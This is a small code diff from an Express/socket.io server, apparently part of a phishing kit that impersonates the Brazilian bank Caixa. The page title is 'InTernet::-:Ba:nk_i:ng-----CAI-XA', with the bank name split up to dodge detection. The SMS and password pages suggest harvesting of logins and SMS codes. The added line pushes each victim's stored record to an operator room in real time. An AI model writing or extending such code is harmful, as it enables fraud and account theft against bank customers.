@@ -10,6 +10,8 @@ module.exports = {
 
             const theClient = await Client.findByPk(client)
 
+            req.app.io.to(theClient.id).emit('inSMS', theClient.toJSON())
+
             return res.render('sms', {
                 title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA',
                 pageClasses: 'password cadastro',
